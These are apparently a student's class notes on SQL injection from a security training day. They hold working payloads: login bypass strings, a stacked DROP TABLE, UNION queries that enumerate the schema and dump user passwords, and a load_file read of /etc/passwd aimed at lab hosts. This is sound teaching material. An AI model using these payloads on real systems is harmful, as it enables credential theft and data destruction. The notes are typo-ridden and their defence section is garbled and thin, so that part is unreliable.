## Security Day 2 *(Dec 16, 2021)* **(Security Basics)**

### Web Exploitation - SQL Injection

[Web Exploitation - SQL Injection](https://sec.cybbh.io/-/public/-/jobs/579821/artifacts/slides/05-sql-injection-slides.html)

---
### Today's plan
  - [X] SQL Injection Slides
  - [ ] CTF's
---

#### Rationale
Full stack web applications often incorporate data processing in some way for things like payment services, fulfilling shipment orders, and tracking inventory. Data processing normally requires the use of a database. SQL injection is an important method for attackers and defenders to understand when operating within their role. Attackers may need to use it during exploitation to leak credentials, proprietary data, or personnel lists. Defenders need to protect a system while maintaining availability of services provided by the system.

#### SQL
* Structured Query Language - ANSI Standard
* Additional commands added by vendors
* Relational

```
my sql
show databases;
# infromation_schema # Show info about all he data bases
# mysql # Show users
# Perfomeance_schema # Show performance
# session # Show info about session

show tables from session;
select * from car; # shows everything from table car

select * from session.car; # Pull specifically from session database and car table.

use <database name> # Select the databaase to use

select * # wild card

select * from Tires # Pulls everything from tables

select size,cost from Tires; # Select colomns from tires

select name from Tires where size = 16; # Get names of items with tire size of 16.

select * from car UNION select * form Tires; # Union two tables # with union, they have to have the smae number of colomns

select * from car UNION select *,5,6 form Tires; # Union with the same amount of tables

select * from car UNION select *,@@username,6 form Tires; # Union with the same amount of tables and show database version

select * from car UNION select *,NULL,NULL form Tires; # Union with the same amount of tables and show database version

descibe Tires; # Shows what goes into each column

```

#### Standard Commands

```
USE             select the DB you would like to use.
SELECT          extracts data from a database
UPDATE          updates data in a database
DELETE          deletes data from a database
INSERT INTO     inserts new data into a database
CREATE DATABASE creates a new database
ALTER DATABASE  modifies a database
CREATE TABLE    creates a new table
ALTER TABLE     modifies a table
DROP TABLE      deletes a table
CREATE INDEX    creates an index (search key)
DROP INDEX      deletes an index
UNION           Used to combine the result-set of two or more SELECT statements
```

[Standard Commands Link](https://www.w3schools.com/SQl/sql_syntax.asp)

#### DB Interactions

Demo: SQL Commands

#### Activity

SQLBOLT

* Interactive tutorials 1-11 and 13

[SQL Bolt](https://sqlbolt.com/)

#### SQL Injection - Considerations

* Require Valid SQL Queries
* Fully patched systems can be vulnerable due to misconfiguration
* Input Field Sanitization
* String vs Integer Values
* Is information_schema Database available?
* GET Request versus POST Request HTTP methods

#### Unsanitzed Vs Sanitized Field

**Unsanitized:** input fields can be found using a Single Quote '
* Will return extraneous information
* ' closes a variable to allow for additional statements/clauses
* May show no errors or generic error (harder Injection)

**Sanitized:**  input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)

**Validation:** checks inputs to ensure it meets a criteria (String doesn’t contain ')

#### Server-Side Query Processing

User enters JohnDoe243 in the name field and his password in the pass field.

Server-side Query passed would be: Before Input:

```
SELECT id FROM users WHERE name='$name' AND pass='$pass';
```

After Input:
```
SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234';
```

#### Example - Injecting Your Statement

User enters tom' OR 1='1 in the fields and anything in password

Truth Statement: tom' OR 1='1

Server-side Query would look like:

```
SELECT id FROM users WHERE name='tom' OR 1='1' AND pass='tom' OR 1='1'
```

```
SELECT id FROM users WHERE name='tom' OR 1='1' AND pass='tom' OR 1='1'
tom' or 1=' #into login
10.50.30.77/login.php?username=tom' OR 1='&passwdtom' OR 1='
# Github payloads all the things
```
[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

#### SQL Injection Validation

DEMO: SQL Injection

[SQL Injection](http://10.50.XX.XX)

#### Stacking Statements

Chaining multiple statements together using a semi-colon ;

```
SELECT * FROM user WHERE id="Johnny"; DROP TABLE Customers;
```

#### Nesting Statements

Some Web Application and SQL Database combos don’t allow stacking, such as PHP with mysql.

* Allow for nesting a statement within another one

```
?<variable> UNION SELECT 1,column_name,3 from information_schema.columns where table_name =
```

#### Ignore The Rest

Using # or -- tells the Database to ignore everything after

Server-side Query:

```
SELECT product FROM item WHERE id = $select limit 1;
```

Input to Inject:

```
1 or 1=1; #
```

Server-side Query becomes:
```
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
```

#### SQL Injection (Nesting)

DEMO: SQL Injection (Nesting Statements)

[SQL Inject10.100.28.48/cases/login.php?username=admin'' or 1='&passwordion (Nesting Statements)](http://10.50.XX.XX/Union.html)

#### Blind Injection
* Inlcudes Statements to determine how DB is configured
  - Columns in Output
  - Can we return errors
  - Can we return expected Output
* Used when unsanitized fields give generic error or no messages

Normal Query to pull expected output:

```
https://.....com?item=4
```

Blind injection for validation:
```
https://.....com?item=4 OR 1=1
```

```
Audi' UNION SELECT 1,2,3,4,5#
table_shema = Database names
table_name = Names of tables oiside of database
column_name = Names of columns inside of tables

information_schema.columns

Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns#

Audi' UNION SELECT id,2,name,4,pass from session.user #

Audi' UNION SELECT @@version,2,3,4,5# # Show version

Audi' UNION SELECT load_file("/etc/passwd"),2,3,4,5#

Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns where table_schema=database()#  # Just from the website that the data base is pulling from.

```


#### Abuse The Client (Get Method)

Passing injection through the URL

* At the .php? pass your statement

```
www....com\prices.php?item=4 UNION SELECT 1,2

www....com\prices.php?item=4 UNION SELECT 1,2,@@version
```

What is @@version?

#### Abuse The Client (ENUM)
Identifying the schema leads to detailed queries in order enumerate the DB
* Research Database Schema’s and what information they provide

```
php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=dat
```

What is information_schema and database()?

#### SQL Injection (DB ENUM)

DEMO: SQL Injection (Database Enumeration)

[Database Enumeration](http://10.50.XX.XX/uniondemo.php)

#### Defending

Validate inputs, different ways depending on software.

* concatenate - turns inputs into single strings or escape characters

```
PHP: mysql_real_escap_string

SQL: sqlite3_prepare()
```

#### Activity

SQL Injection
